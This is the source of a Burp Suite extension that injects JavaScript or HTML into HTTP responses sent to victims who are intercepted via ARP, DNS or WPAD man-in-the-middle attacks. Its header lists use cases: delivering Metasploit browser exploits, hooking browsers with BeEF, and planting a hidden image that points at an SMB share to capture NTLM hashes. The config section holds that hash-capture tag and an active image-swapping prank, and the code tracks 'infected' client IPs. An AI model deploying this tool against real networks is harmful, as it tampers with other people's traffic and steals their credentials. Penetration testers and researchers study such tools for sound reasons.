
#
# HTTP Injector
# version 0.6
# 
# The builtin "Match and Replace" feature applies a simple regexp to every request/response
# No way to 1) restrict to scope 2) do complex filtering 3) target specific IP addresses
#
# This extension allows to inject some JavaScript if:
# - the client wasn't already infected (3 ways to manage duplicates)
# - the page URL is in scope (or not)
# - the response body matches a specific string
# - the response has the desired MIME type
# The target is usually externally MITM-ed via ARP, DNS or WPAD attacks
#
# Use cases:
# 1) load a client side-side attack in an iframe (like Metasploit Browser AutoPwn)
# 2) inject BeEF hooks
# 3) load Firebug Lite in a mobile browser like iPad and iPhone
# 4) add a <img> tag pointing to a SMB share in order to capture NTLM hashes
#
# Please edit between "START CONFIG" and "END CONFIG" to match your needs
#
# By Nicolas Gregoire
# @Agarri_FR // nicolas.gregoire@agarri.fr
#


# imports specific to Burp
from burp import IBurpExtender
from burp import IProxyListener

# other imports
import array
from java.io import PrintWriter

class BurpExtender(IBurpExtender, IProxyListener):

	#
	# implement IBurpExtender
	#

	def registerExtenderCallbacks(self, callbacks):
        
		##### START CONFIG ##### ##### START CONFIG ##### ##### START CONFIG #####

		# prefix </head> with some JavaScript code (BeEF, FireBug Lite)
		# self._marker = "</head>"
		# self._code = "<script type='text/javascript' src='https://getfirebug.com/releases/lite/1.4/firebug-lite.js#startOpened=true'></script>" + self._marker

		# prefix </body> with an invisible image (NTLM hashes)
		# self._marker = "</body>"
		# self._code = "<img src='file://192.168.2.66/images/asgo_sm_165283.png' style='display:none'/>" + self._marker

		# replace images (stupid prank)
		self._marker = "<img "
		self._code = "<img src='http://www.agarri.fr/images/hacked.png' "

		# log more information
		self._verbose = True

		# infect only pages matching the scope defined in Burp
		self._infect_only_in_scope = False

		# manage infection duplicates
		# 0: do not manage duplicates / infect every page (if MIME type and scope are OK)
		# 1: one infection by source IP address / useful when deploying client-side attacks (Metasploit, image stored on a SMB share)
		# 2: one infection by source IP address and service / useful when using BeEF
		# 3: one infection by source IP address and URL (including GET parameters) / useful when injecting FireBug Lite
		self._duplicates = 0

		# desired MIME type
		self._mime_type = 'HTML'

		##### END CONFIG ##### ##### END CONFIG ##### ##### END CONFIG #####

		# set our extension name
		callbacks.setExtensionName("HTTP Injector")

		# keep a reference to our callbacks object
		self._callbacks = callbacks

		# obtain an extension helpers object
		self._helpers = callbacks.getHelpers()
	
		# obtain stdout stream
		self._stdout = PrintWriter(callbacks.getStdout(), True)

		# will contain the IP of infected hosts
		self._infected = []

		# register ourselves as a Proxy listener
		callbacks.registerProxyListener(self)

		# log configuration options
		self._stdout.println("[=] CONFIG: Manage duplicates = [%s]" % (self._duplicates))
		self._stdout.println("[=] CONFIG: Targeted MIME type = [%s]" % (self._mime_type))
		self._stdout.println("[=] CONFIG: Marker = [%s]" % (self._marker))
		self._stdout.println("[=] CONFIG: Code = [%s]" % (self._code))
		self._stdout.println("[=] CONFIG: Check scope = [%s]" % (self._infect_only_in_scope))
		self._stdout.println("[=] CONFIG: Verbose = [%s]" % (self._verbose))

		return

	#
	# implement IBurpListener
	#

	def processProxyMessage(self, messageIsRequest, message):

		# do not process requests
		if messageIsRequest:
			return

		# get the IP of the client
		client = message.getClientIpAddress().getHostAddress()

		# get an unique reference to this message
		ref = message.getMessageReference()

		# parse the response
		response = message.getMessageInfo().getResponse()
		parsed_response = self._helpers.analyzeResponse(response)

		# parse the corresponding request
		request = message.getMessageInfo()
		parsed_request = self._helpers.analyzeRequest(request)

		# manage duplicates
		if self._duplicates == 0:
			# infect every request / not really useful
			pass
		elif self._duplicates == 1:
			# one infection by source IP address / useful when deploying client-side attacks
			sig = client
		elif self._duplicates == 2:
			# one infection by source IP address and service / useful when using BeEF
			service = message.getMessageInfo().getHttpService()
			sig = client + "||" + service.getProtocol() + "://" + service.getHost() + ":" + str(service.getPort())
		elif self._duplicates == 3:
			# one infection by source IP address and URL / useful when injecting FireBug Lite
			sig = client + "||" + str(parsed_request.getUrl())

		# if needed, do not process already infected hosts
		if (self._duplicates != 0) and (sig in self._infected):
			# self._stdout.println("[-] #%d (%s)  Sig is [%s]" % (ref, client, sig))
			if self._verbose:
				self._stdout.println("[-] #%d (%s) Response was NOT infected (already infected)" % (ref, client))
			return

		# if needed, do not process out of scope messages
		if self._infect_only_in_scope and not self._callbacks.isInScope(parsed_request.getUrl()):
			if self._verbose:
				self._stdout.println("[-] #%d (%s) Response was NOT infected (not in scope)" % (ref, client))
			return
	
		# check MIME type
		inferred_mime_type = parsed_response.getInferredMimeType()
		stated_mime_type = parsed_response.getStatedMimeType()
		if inferred_mime_type != self._mime_type:
			if self._verbose:
				self._stdout.println("[!] #%d (%s) Response was NOT infected (MIME type != '%s')" % (ref, client, self._mime_type))
			return

		# extract the body and headers
		headers = parsed_response.getHeaders()
		body = response[parsed_response.getBodyOffset():]

		# infect only if the marker is found in the body
		if not self._marker in body.tostring():
			if self._verbose:
				self._stdout.println("[-] #%d (%s) Response was NOT infected (no marker in body)" % (ref, client))
			return
			
		# infect the body and convert to bytes
		infected_body = self._helpers.bytesToString(body.tostring().replace(self._marker, self._code))
		self._stdout.println("[+] #%d (%s) Response was infected! %s" % (ref, client, str(parsed_request.getUrl())))

		# if needed, add this signature to the list of infected ones
		if self._duplicates != 0:
			self._infected.append(sig)

		# update the response (will also update the Content-Length header)
		message.getMessageInfo().setResponse(self._helpers.buildHttpMessage(headers, infected_body))

		# tag the message in Proxy / History
		message.getMessageInfo().setComment("Source '%s' was infected!" % client)
		message.getMessageInfo().setHighlight("yellow")
	
		return
